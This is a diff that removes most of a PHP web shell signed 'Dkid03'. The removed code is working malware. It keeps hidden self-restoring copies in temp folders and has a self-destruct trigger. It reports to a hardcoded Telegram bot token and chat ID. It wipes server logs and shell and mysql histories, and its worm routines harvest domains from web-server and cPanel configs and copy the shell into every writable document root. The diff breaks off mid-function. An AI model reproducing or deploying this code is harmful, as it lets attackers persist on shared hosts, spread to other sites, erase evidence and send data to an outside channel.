@@ -1,3105 +1,995 @@
 <?php
-//Maker: Dkid03
-//Don't change the author 
-
-$CURRENT_SHELL = basename(__FILE__);
-
-function auto_restore_by_name() {
-    global $CURRENT_SHELL;
-    
-    $backup_locations = [
-        '/tmp/' . md5($CURRENT_SHELL) . '.inc',
-        '/var/tmp/' . md5($CURRENT_SHELL) . '.inc',
-        '/dev/shm/' . md5($CURRENT_SHELL) . '.inc',
-    ];
-    
-    if (!file_exists(__DIR__ . '/' . $CURRENT_SHELL)) {
-        foreach ($backup_locations as $backup) {
-            if (file_exists($backup)) {
-                @copy($backup, __DIR__ . '/' . $CURRENT_SHELL);
-                @chmod(__DIR__ . '/' . $CURRENT_SHELL, 0644);
-                return true;
-            }
-        }
-    }
-    
-    foreach ($backup_locations as $backup) {
-        $dir = dirname($backup);
-        if (!is_dir($dir)) @mkdir($dir, 0700, true);
-        if (!file_exists($backup)) {
-            @copy(__FILE__, $backup);
-            @chmod($backup, 0444);
-        }
-    }
-    
-    return false;
-}
-
-auto_restore_by_name();
-
-if (isset($_GET['kill']) && $_GET['kill'] === 'dkid03') {
-    $file = __FILE__;
-    if (function_exists('shell_exec')) {
-        @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
-        @shell_exec("chattr -a " . escapeshellarg($file) . " 2>/dev/null");
-        @shell_exec("chmod 777 " . escapeshellarg($file) . " 2>/dev/null");
-        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
-        @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
-        @shell_exec("dd if=/dev/urandom of=" . escapeshellarg($file) . " bs=1M count=1 2>/dev/null");
-        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
-    }
-    @chmod($file, 0777);
-    @unlink($file);
-    echo "Self-destruct executed!";
-    exit;
-}
-
-// ==================== LOGOUT HANDLER ====================
-if (isset($_GET['logout'])) {
-    session_start();
-    $_SESSION['logout_success'] = true;
-    session_destroy();
-    header('Location: ?');
-    exit;
-}
-
-session_start();
-
-// ===== DEBUG MODE =====
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
-// ==================== KONFIGURASI ====================
-$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
-$telegramUserId = '7547598395';
-$verifCode = 'Dkid@123';
-
-if (!function_exists('shell_exec')) {
-    function shell_exec($cmd) { return 'shell_exec tidak tersedia di server ini.'; }
-}
-
-$rootPath = realpath(__DIR__);
-$editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'ini', 'log', 'htaccess'];
-$specialDirectories = [
-    'public_html' => realpath($_SERVER['DOCUMENT_ROOT'] ?? ''),
-    'user' => realpath('/home'),
-    'etc' => realpath('/etc'),
-    'log' => realpath('/var/log'),
-    'homeshell' => $rootPath
-];
-$specialDirectories = array_filter($specialDirectories, function($d) { return $d && is_dir($d); });
-
-// ==================== GET CURRENT DOMAIN ====================
-function get_current_domain() {
-    $domain = $_SERVER['HTTP_HOST'] ?? '';
-    if (empty($domain) || $domain == 'localhost') {
-        $domain = $_SERVER['SERVER_NAME'] ?? '';
-    }
-    if (empty($domain)) {
-        if (function_exists('shell_exec')) {
-            $domain = trim(@shell_exec('hostname -f 2>/dev/null'));
-        }
-    }
-    if (empty($domain)) {
-        $domain = 'unknown';
-    }
-    return $domain;
-}
-
-// ==================== GET FILE LOCATION ====================
-function get_file_location() {
-    $file = __FILE__;
-    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    $domain = get_current_domain();
-    $relative_path = str_replace($docRoot, '', $file);
-    $relative_path = ltrim($relative_path, '/');
-    $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
-    $url = $protocol . $domain . '/' . $relative_path;
-    return [
-        'url' => $url,
-        'path' => $file,
-        'domain' => $domain,
-        'relative' => $relative_path
-    ];
-}
-
-// ==================== FUNGSI UTILITY ====================
-function sendTelegramMessage($botToken, $chatId, $message) {
-    if (empty($botToken) || empty($chatId) || empty($message)) return false;
-    if (strlen($message) > 4096) {
-        $message = substr($message, 0, 4000) . "\n\n... (dipotong)";
-    }
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $data = [
-        'chat_id' => $chatId, 
-        'text' => $message, 
-        'parse_mode' => 'HTML', 
-        'disable_web_page_preview' => true
-    ];
-    $postData = http_build_query($data);
-    
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
-        $result = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($result !== false && $httpCode == 200) {
-            $response = json_decode($result, true);
-            if (isset($response['ok']) && $response['ok'] === true) return true;
-        }
-    }
-    
-    if (ini_get('allow_url_fopen')) {
-        $options = [
-            'http' => [
-                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
-                'method' => 'POST',
-                'content' => $postData,
-                'timeout' => 30
-            ],
-            'ssl' => [
-                'verify_peer' => false,
-                'verify_peer_name' => false
-            ]
-        ];
-        $context = stream_context_create($options);
-        $result = @file_get_contents($url, false, $context);
-        if ($result !== false) {
-            $response = json_decode($result, true);
-            if (isset($response['ok']) && $response['ok'] === true) return true;
-        }
-    }
-    return false;
-}
-
-function isRoot() {
-    if (!function_exists('shell_exec')) return false;
-    $output = @shell_exec('whoami 2>/dev/null');
-    return trim($output) === 'root';
-}
-
-function formatSize($bytes) {
-    if ($bytes === false || $bytes === null) return '0 bytes';
-    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
-    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
-    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
-    return $bytes . ' bytes';
-}
-
-function deleteDirectory($dir) {
-    if (!file_exists($dir)) return true;
-    if (!is_dir($dir)) return unlink($dir);
-    $items = @scandir($dir);
-    if ($items === false) return false;
-    foreach ($items as $item) {
-        if ($item == '.' || $item == '..') continue;
-        $path = $dir . DIRECTORY_SEPARATOR . $item;
-        is_dir($path) ? deleteDirectory($path) : @unlink($path);
-    }
-    return rmdir($dir);
-}
-
-function breadcrumb($path, $rootPath, $specialDirs) {
-    $breadcrumb = '<a href="?path=">Home</a> <span style="color:#8b949e;">/</span> ';
-    foreach ($specialDirs as $name => $dirPath) {
-        if ($dirPath && is_dir($dirPath)) {
-            $breadcrumb .= '<a href="?path=' . urlencode($dirPath) . '">' . htmlspecialchars($name) . '</a> <span style="color:#8b949e;">/</span> ';
-        }
-    }
-    $relative = str_replace($rootPath, '', $path);
-    $parts = array_filter(explode('/', $relative));
-    $current = '';
-    foreach ($parts as $part) {
-        $current .= '/' . $part;
-        $breadcrumb .= '<a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a> <span style="color:#8b949e;">/</span> ';
-    }
-    return rtrim($breadcrumb, ' /');
-}
-
-function isSafePath($path, $rootPath, $specialDirs) {
-    if (strpos($path, $rootPath) === 0) return true;
-    foreach ($specialDirs as $dirPath) {
-        if ($dirPath && strpos($path, $dirPath) === 0) return true;
-    }
-    return false;
-}
-
-function getAllSubDirectories($dir) {
-    $subDirs = [];
-    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
-    $items = @scandir($dir);
-    if ($items === false) return $subDirs;
-    foreach ($items as $item) {
-        if ($item == '.' || $item == '..') continue;
-        $path = $dir . DIRECTORY_SEPARATOR . $item;
-        if (is_dir($path) && !is_link($path)) {
-            $subDirs[] = $path;
-            $subDirs = array_merge($subDirs, getAllSubDirectories($path));
-        }
-    }
-    return $subDirs;
-}
-
-function getImmediateSubDirectories($dir) {
-    $subDirs = [];
-    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
-    $items = @scandir($dir);
-    if ($items === false) return $subDirs;
-    foreach ($items as $item) {
-        if ($item == '.' || $item == '..') continue;
-        $path = $dir . DIRECTORY_SEPARATOR . $item;
-        if (is_dir($path) && !is_link($path)) $subDirs[] = $path;
-    }
-    return $subDirs;
-}
-
-function bulkDeleteFiles($baseDir, $fileList, $mode) {
-    $targetDirs = [$baseDir];
-    if ($mode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($baseDir));
-    elseif ($mode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($baseDir));
-    $results = ['deleted' => [], 'not_found' => [], 'errors' => []];
-    $files = array_filter(array_map('trim', explode("\n", $fileList)));
-    foreach ($targetDirs as $dir) {
-        if (!is_dir($dir) || !is_writable($dir)) continue;
-        foreach ($files as $file) {
-            $path = $dir . DIRECTORY_SEPARATOR . basename($file);
-            if (is_file($path)) @unlink($path) ? $results['deleted'][] = $path : $results['errors'][] = $path;
-            elseif (!in_array($file, $results['not_found'])) $results['not_found'][] = $file;
-        }
-    }
-    return $results;
-}
-
-function getSystemInfo() {
-    return [
-        'PHP Version' => phpversion(),
-        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
-        'Server API' => php_sapi_name(),
-        'max_execution_time' => ini_get('max_execution_time') . ' seconds',
-        'memory_limit' => ini_get('memory_limit'),
-        'upload_max_filesize' => ini_get('upload_max_filesize'),
-        'post_max_size' => ini_get('post_max_size'),
-        'Disabled Functions' => ini_get('disable_functions') ?: 'none',
-        'Safe Mode' => ini_get('safe_mode') ? 'On' : 'Off',
-        'Operating System' => php_uname('s') . ' ' . php_uname('r'),
-        'Current User' => get_current_user(),
-        'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
-        'Script Path' => __FILE__
-    ];
-}
-
-function isTerminalActive() {
-    if (!function_exists('shell_exec')) return false;
-    if (ini_get('safe_mode')) return false;
-    $disabled = explode(',', ini_get('disable_functions') ?: '');
-    if (in_array('shell_exec', array_map('trim', $disabled))) return false;
-    return @shell_exec('echo 1') !== null;
-}
-
-// ===== SCAN ALL .cache DIRECTORIES =====
-function scan_cache_dirs_safe($dir) {
-    $results = [];
-    if (!is_dir($dir) || !is_readable($dir)) return $results;
-    
-    if ($dir == '/' || $dir == '/root') {
-        return $results;
-    }
-    
-    $items = @scandir($dir);
-    if ($items === false) return $results;
-    
-    foreach ($items as $item) {
-        if ($item == '.' || $item == '..') continue;
-        $path = $dir . '/' . $item;
-        if (is_dir($path) && $item == '.cache') {
-            $results[] = $path;
-        } elseif (is_dir($path)) {
-            $results = array_merge($results, scan_cache_dirs_safe($path));
-        }
-    }
-    return $results;
-}
-
-// ==================== CLEAN TRACES ====================
-function clean_traces() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $access_logs = ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'];
-    foreach ($access_logs as $log) {
-        if (file_exists($log) && is_writable($log)) {
-            @file_put_contents($log, '');
-            $results[] = "Cleaned: $log";
-        }
-    }
-    $error_logs = ['/var/log/apache2/error.log', '/var/log/nginx/error.log', '/var/log/httpd/error_log'];
-    foreach ($error_logs as $log) {
-        if (file_exists($log) && is_writable($log)) {
-            @file_put_contents($log, '');
-            $results[] = "Cleaned: $log";
-        }
-    }
-    if (function_exists('shell_exec')) {
-        $users = @explode("\n", @shell_exec('ls /home 2>/dev/null'));
-        if ($users !== false) {
-            foreach ($users as $user) {
-                $user = trim($user);
-                if (empty($user)) continue;
-                $hist = "/home/$user/.bash_history";
-                if (file_exists($hist)) @file_put_contents($hist, '');
-                $hist = "/home/$user/.mysql_history";
-                if (file_exists($hist)) @file_put_contents($hist, '');
-            }
-        }
-        if (file_exists('/root/.bash_history')) @file_put_contents('/root/.bash_history', '');
-        if (file_exists('/root/.mysql_history')) @file_put_contents('/root/.mysql_history', '');
-    }
-    $msg = "🧹 *Traces Cleaned*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $results;
-}
-
-// ==================== GET ALL DOCUMENT ROOTS ====================
-function get_all_document_roots_cached($ttl = 300) {
-    $cache_file = __DIR__ . '/.docroots_cache';
-    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
-        $data = @file_get_contents($cache_file);
-        if ($data !== false) {
-            $roots = json_decode($data, true);
-            if (is_array($roots) && !empty($roots)) return $roots;
-        }
-    }
-    $roots = []; 
-    $processed = [];
-    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
-        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if ($lines !== false) {
-            foreach ($lines as $line) {
-                if (strpos($line, ':') === false) continue;
-                list($domain, $user) = explode(':', $line);
-                $user = trim($user);
-                if (!empty($user) && !in_array($user, $processed)) {
-                    $docRoot = "/home/{$user}/public_html";
-                    if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; }
-                    $docRoot = "/home/{$user}/www";
-                    if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . '_www'; }
-                }
-            }
-        }
-    }
-    $homeDirs = @glob('/home/*', GLOB_ONLYDIR);
-    if ($homeDirs !== false) {
-        foreach ($homeDirs as $home) {
-            $user = basename($home);
-            if (in_array($user, $processed)) continue;
-            $docRoot = $home . '/public_html';
-            if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; }
-            $docRoot = $home . '/www';
-            if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . '_www'; }
-        }
-    }
-    if (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']) && !in_array($_SERVER['DOCUMENT_ROOT'], $roots)) {
-        $roots[] = $_SERVER['DOCUMENT_ROOT'];
-    }
-    $extraDirs = ['/tmp', '/var/tmp', '/home', '/var/log', '/etc', '/usr/local', '/opt', '/srv'];
-    foreach ($extraDirs as $dir) {
-        if (is_dir($dir) && !in_array($dir, $roots)) { $roots[] = $dir; }
-        $subs = @glob($dir . '/*', GLOB_ONLYDIR);
-        if ($subs !== false) {
-            foreach ($subs as $sub) {
-                if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) { $roots[] = $sub; }
-            }
-        }
-    }
-    $roots = array_unique($roots);
-    $roots = array_filter($roots, 'is_dir');
-    $roots = array_values($roots);
-    @file_put_contents($cache_file, json_encode($roots));
-    return $roots;
-}
-
-function get_all_domains_by_ip_cached($ttl = 300) {
-    $cache_file = __DIR__ . '/.domains_cache';
-    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
-        $data = @file_get_contents($cache_file);
-        if ($data !== false) {
-            $domains = json_decode($data, true);
-            if (is_array($domains) && !empty($domains)) return $domains;
-        }
-    }
-    $domains = [];
-    $ip = $_SERVER['SERVER_ADDR'] ?? '';
-    if (empty($ip) && function_exists('shell_exec')) {
-        $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\''));
-    }
-    $ip = trim($ip);
-    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
-        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if ($lines !== false) {
-            foreach ($lines as $line) {
-                if (strpos($line, ':') === false) continue;
-                list($domain, $user) = explode(':', $line);
-                $domains[] = trim($domain);
-            }
-        }
-    }
-    if (file_exists('/etc/domains') && is_readable('/etc/domains')) {
-        $lines = @file('/etc/domains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if ($lines !== false) {
-            foreach ($lines as $line) {
-                if (strpos($line, '=') === false) continue;
-                list($domain, $user) = explode('=', $line);
-                $domains[] = trim($domain);
-            }
-        }
-    }
-    $apacheConfigs = ['/etc/apache2/sites-enabled/*.conf', '/etc/httpd/conf.d/*.conf', '/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf'];
-    foreach ($apacheConfigs as $pattern) {
-        $files = @glob($pattern);
-        if ($files !== false) {
-            foreach ($files as $conf) {
-                if (!is_file($conf) || !is_readable($conf)) continue;
-                $content = @file_get_contents($conf);
-                if ($content === false) continue;
-                preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches);
-                foreach ($matches[1] as $domain) $domains[] = trim($domain);
-                preg_match_all('/ServerAlias\s+([^\s]+)/i', $content, $matches2);
-                foreach ($matches2[1] as $domain) $domains[] = trim($domain);
-                preg_match_all('/<VirtualHost[^>]*>\s*ServerName\s+([^\s]+)/i', $content, $matches3);
-                foreach ($matches3[1] as $domain) $domains[] = trim($domain);
-            }
-        }
-    }
-    $nginxConfigs = ['/etc/nginx/sites-enabled/*.conf', '/etc/nginx/conf.d/*.conf', '/etc/nginx/nginx.conf'];
-    foreach ($nginxConfigs as $pattern) {
-        $files = @glob($pattern);
-        if ($files !== false) {
-            foreach ($files as $conf) {
-                if (!is_file($conf) || !is_readable($conf)) continue;
-                $content = @file_get_contents($conf);
-                if ($content === false) continue;
-                preg_match_all('/server_name\s+([^;]+)/i', $content, $matches);
-                foreach ($matches[1] as $server_names) {
-                    foreach (explode(' ', $server_names) as $domain) {
-                        $domain = trim($domain);
-                        if (!empty($domain) && $domain != '_') $domains[] = $domain;
-                    }
-                }
-            }
-        }
-    }
-    if (function_exists('shell_exec') && !empty($ip)) {
-        $hostname = @shell_exec("host $ip 2>/dev/null | awk '{print \$5}'");
-        if ($hostname && strpos($hostname, '.') !== false) $domains[] = trim($hostname);
-    }
-    $namedFiles = @glob('/var/named/*.db');
-    if ($namedFiles !== false) {
-        foreach ($namedFiles as $file) {
-            if (!is_file($file) || !is_readable($file)) continue;
-            $content = @file_get_contents($file);
-            if ($content === false) continue;
-            preg_match_all('/\s+IN\s+A\s+([0-9.]+)/', $content, $matches);
-            foreach ($matches[1] as $dnsIp) {
-                if (trim($dnsIp) == $ip) {
-                    $domain = basename($file, '.db');
-                    if (!empty($domain) && strpos($domain, '.') !== false) $domains[] = $domain;
-                }
-            }
-        }
-    }
-    if (file_exists('/etc/hosts') && is_readable('/etc/hosts')) {
-        $lines = @file('/etc/hosts');
-        if ($lines !== false) {
-            foreach ($lines as $line) {
-                if (strpos($line, $ip) !== false && strpos($line, 'localhost') === false) {
-                    $parts = preg_split('/\s+/', trim($line));
-                    foreach ($parts as $part) {
-                        if (filter_var($part, FILTER_VALIDATE_IP) === false && strpos($part, '.') !== false) $domains[] = $part;
-                    }
-                }
-            }
-        }
-    }
-    $blacklist = ['www.example.com', 'localhost', '127.0.0.1'];
-    $domains = array_unique($domains);
-    $domains = array_filter($domains, function($d) use ($blacklist) {
-        return !empty($d) && strpos($d, '.') !== false && strpos($d, '*') === false && !in_array($d, $blacklist);
-    });
-    $domains = array_values($domains);
-    @file_put_contents($cache_file, json_encode($domains));
-    return $domains;
-}
-
-// ==================== WORM FUNCTIONS ====================
-function get_best_document_root($domain, $roots) {
-    $domain = trim($domain);
-    $domain = str_replace(['http://', 'https://', 'www.'], '', $domain);
-    $candidates = [
-        "/home/{$domain}/public_html",
-        "/home/{$domain}/www",
-        "/var/www/{$domain}/public_html",
-        "/var/www/{$domain}/html",
-        "/var/www/html/{$domain}",
-        "/var/www/vhosts/{$domain}/public_html",
-        "/var/www/vhosts/{$domain}/httpdocs",
-        "/srv/www/{$domain}/public_html",
-        "/usr/local/apache2/htdocs/{$domain}",
-        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''),
-        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
-    ];
-    foreach ($roots as $root) {
-        if (strpos($root, $domain) !== false) { $candidates[] = $root; }
-        $path_parts = explode('/', $root);
-        foreach ($path_parts as $part) {
-            if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) {
-                $candidates[] = $root;
-                break;
-            }
-        }
-    }
-    usort($candidates, function($a, $b) {
-        $a_score = (strpos($a, 'public_html') !== false) ? 3 : 0;
-        $a_score += (strpos($a, 'www') !== false) ? 2 : 0;
-        $a_score += (strpos($a, 'html') !== false) ? 1 : 0;
-        $b_score = (strpos($b, 'public_html') !== false) ? 3 : 0;
-        $b_score += (strpos($b, 'www') !== false) ? 2 : 0;
-        $b_score += (strpos($b, 'html') !== false) ? 1 : 0;
-        return $b_score - $a_score;
-    });
-    $candidates = array_unique($candidates);
-    foreach ($candidates as $path) {
-        if ($path && is_dir($path) && is_writable($path)) { return $path; }
-    }
-    return false;
-}
-
-function worm_spread_to_domains($currentFile) {
-    global $botToken, $telegramUserId;
-    $infected = []; 
-    $domainLinks = [];
-    $errors = [];
-    $domains = get_all_domains_by_ip_cached(); 
-    $roots = get_all_document_roots_cached();
-    $myFile = basename($currentFile);
-    
-    if (empty($domains)) {
-        $domains = [];
-        if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
-            $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-            if ($lines !== false) {
-                foreach ($lines as $line) {
-                    if (strpos($line, ':') === false) continue;
-                    list($domain, $user) = explode(':', $line);
-                    $domains[] = trim($domain);
-                }
-            }
-        }
-        $domains[] = $_SERVER['HTTP_HOST'] ?? 'localhost';
-        $domains = array_unique($domains);
-    }
-    
-    foreach ($domains as $domain) {
-        $dir = get_best_document_root($domain, $roots);
-        if ($dir && is_dir($dir) && is_writable($dir)) {
-            $targetFile = $dir . '/' . $myFile;
-            if (!file_exists($targetFile)) { 
-                if (@copy($currentFile, $targetFile)) {
-                    @chmod($targetFile, 0644); 
-                    $infected[] = $dir;
-                    $domainLinks[] = "http://{$domain}/{$myFile}";
-                } else {
-                    $errors[] = "Gagal copy ke: $domain";
-                }
-            } else {
-                $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
-            }
-        }
-    }
-    
-    $msg = "🪱 *WORM SPREAD TO DOMAINS*\n\n"
-         . "📊 Total domain: " . count($domains) . "\n"
-         . "✅ Berhasil: " . count($infected) . "\n"
-         . "❌ Gagal: " . count($errors) . "\n\n";
-    if (!empty($domainLinks)) {
-        $msg .= "📁 *Results:*\n" . implode("\n", array_slice($domainLinks, 0, 20));
-        if (count($domainLinks) > 20) {
-            $msg .= "\n... dan " . (count($domainLinks) - 20) . " lainnya";
-        }
-    }
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $infected;
-}
-
-function worm_infect_all_domains($currentFile) {
-    global $botToken, $telegramUserId;
-    $infected = [];
-    $domainLinks = [];
-    $errors = [];
-    $all_domains = [];
-    $myFile = basename($currentFile);
-    $hostname = $_SERVER['HTTP_HOST'] ?? 'localhost';
-    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    
-    $exclude_dirs = [
-        '.well-known', '.git', '.svn', '.cpanel', '.backup', '.cache',
-        '.trash', '.tmp', 'tmp', 'temp', 'cache', 'backup', 'logs', 'log',
-        'error_logs', 'phpmyadmin', 'pma', 'adminer', 'vendor', 'node_modules',
-        'bower_components', 'wp-admin', 'wp-includes', 'wp-content/cache',
-        'wp-content/uploads', 'wp-content/backup', 'storage', 'bootstrap',
-        'config', 'database', 'resources', 'tests', 'docs', 'examples',
-        'sample', 'demo', 'test'
-    ];
-    
-    if (function_exists('shell_exec')) {
-        $apache_configs = [
-            '/etc/apache2/sites-enabled/*.conf',
-            '/etc/apache2/sites-available/*.conf',
-            '/etc/httpd/conf.d/*.conf',
-            '/etc/httpd/conf/httpd.conf',
-            '/etc/apache2/apache2.conf',
-            '/usr/local/apache2/conf/httpd.conf',
-            '/usr/local/apache/conf/httpd.conf'
-        ];
-        foreach ($apache_configs as $pattern) {
-            $files = @glob($pattern);
-            if ($files !== false) {
-                foreach ($files as $conf) {
-                    if (!is_file($conf) || !is_readable($conf)) continue;
-                    $content = @file_get_contents($conf);
-                    if ($content === false) continue;
-                    preg_match_all('/DocumentRoot\s+([^\s]+)/i', $content, $matches);
-                    foreach ($matches[1] as $dir) {
-                        $dir = trim($dir);
-                        $dir = str_replace(['"', "'"], '', $dir);
-                        if (!empty($dir) && is_dir($dir)) {
-                            $all_domains[] = ['dir' => $dir, 'source' => 'apache'];
-                        }
-                    }
-                    preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches2);
-                    foreach ($matches2[1] as $domain) {
-                        $domain = trim($domain);
-                        if (!empty($domain) && strpos($domain, '.') !== false) {
-                            $all_domains[] = ['domain' => $domain, 'source' => 'apache'];
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    if (function_exists('shell_exec')) {
-        $nginx_configs = [
-            '/etc/nginx/sites-enabled/*.conf',
-            '/etc/nginx/sites-available/*.conf',
-            '/etc/nginx/conf.d/*.conf',
-            '/etc/nginx/nginx.conf',
-            '/usr/local/nginx/conf/nginx.conf'
-        ];
-        foreach ($nginx_configs as $pattern) {
-            $files = @glob($pattern);
-            if ($files !== false) {
-                foreach ($files as $conf) {
-                    if (!is_file($conf) || !is_readable($conf)) continue;
-                    $content = @file_get_contents($conf);
-                    if ($content === false) continue;
-                    preg_match_all('/root\s+([^;]+)/i', $content, $matches);
-                    foreach ($matches[1] as $dir) {
-                        $dir = trim($dir);
-                        $dir = str_replace(['"', "'"], '', $dir);
-                        if (!empty($dir) && is_dir($dir)) {
-                            $all_domains[] = ['dir' => $dir, 'source' => 'nginx'];
-                        }
-                    }
-                    preg_match_all('/server_name\s+([^;]+)/i', $content, $matches2);
-                    foreach ($matches2[1] as $domains) {
-                        $domains = trim($domains);
-                        foreach (explode(' ', $domains) as $domain) {
-                            $domain = trim($domain);
-                            if (!empty($domain) && $domain != '_' && strpos($domain, '.') !== false) {
-                                $all_domains[] = ['domain' => $domain, 'source' => 'nginx'];
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
-        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if ($lines !== false) {
-            foreach ($lines as $line) {
-                if (strpos($line, ':') === false) continue;
-                list($domain, $user) = explode(':', $line);
-                $domain = trim($domain);
-                $user = trim($user);
-                if (!empty($domain) && !empty($user)) {
-                    $dirs = [
-                        "/home/{$user}/public_html",
-                        "/home/{$user}/www",
-                        "/home/{$user}/public",
-                        "/home/{$user}/html"
-                    ];
-                    foreach ($dirs as $dir) {
-                        if (is_dir($dir)) {
-                            $all_domains[] = ['dir' => $dir, 'domain' => $domain, 'source' => 'cpanel'];
-                            break;
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    $home_dirs = @glob('/home/*', GLOB_ONLYDIR);
-    if ($home_dirs !== false) {
-        foreach ($home_dirs as $home) {
-            $user = basename($home);
-            $dirs = [
-                $home . '/public_html',
-                $home . '/www',
-                $home . '/public',
-                $home . '/html'
-            ];
-            foreach ($dirs as $dir) {
-                if (is_dir($dir)) {
-                    $all_domains[] = ['dir' => $dir, 'source' => 'home', 'user' => $user];
-                    break;
-                }
-            }
-        }
-    }
-    
-    $common_dirs = [
-        '/var/www/html',
-        '/var/www',
-        '/usr/share/nginx/html',
-        '/usr/local/apache2/htdocs',
-        '/var/www/vhosts',
-        '/srv/www',
-        '/opt/bitnami/apache/htdocs',
-        '/var/www/domains'
-    ];
-    foreach ($common_dirs as $dir) {
-        if (is_dir($dir)) {
-            $all_domains[] = ['dir' => $dir, 'source' => 'common'];
-        }
-    }
-    
-    $roots = get_all_document_roots_cached();
-    foreach ($roots as $root) {
-        if (is_dir($root)) {
-            $all_domains[] = ['dir' => $root, 'source' => 'docroot'];
-        }
-    }
-    
-    $unique_dirs = [];
-    $domain_map = [];
-    $dirs_to_infect = [];
-    
-    foreach ($all_domains as $item) {
-        $dir = $item['dir'] ?? '';
-        $domain = $item['domain'] ?? '';
-        $source = $item['source'] ?? '';
-        if (empty($dir) || !is_dir($dir)) continue;
-        $dir_name = basename($dir);
-        $skip = false;
-        foreach ($exclude_dirs as $exclude) {
-            if (strpos($dir, $exclude) !== false || $dir_name === $exclude) {
-                $skip = true;
-                break;
-            }
-        }
-        if ($skip) continue;
-        if (strpos($dir, '/tmp') === 0 || strpos($dir, '/var/tmp') === 0 || strpos($dir, '/dev/shm') === 0) continue;
-        if ($dir_name === '.well-known' || strpos($dir, '.well-known') !== false) continue;
-        if (!empty($docRoot) && strpos($dir, $docRoot) !== 0) {
-            $found = false;
-            foreach ($roots as $root) {
-                if (strpos($dir, $root) === 0) { $found = true; break; }
-            }
-            if (!$found && $source !== 'cpanel' && $source !== 'home') continue;
-        }
-        if (!empty($domain) && strpos($domain, '.') !== false) {
-            $domain_map[$dir] = $domain;
-        }
-        if (!in_array($dir, $unique_dirs)) {
-            $unique_dirs[] = $dir;
-            $dirs_to_infect[] = ['dir' => $dir, 'domain' => $domain, 'source' => $source];
-        }
-    }
-    
-    $total_dirs = count($dirs_to_infect);
-    $success_count = 0;
-    $domain_list = array_unique(array_filter(array_column($dirs_to_infect, 'domain')));
-    $domain_list = array_filter($domain_list, function($d) { return !empty($d) && strpos($d, '.') !== false; });
-    
-    foreach ($dirs_to_infect as $item) {
-        $dir = $item['dir'];
-        $domain = $item['domain'] ?? '';
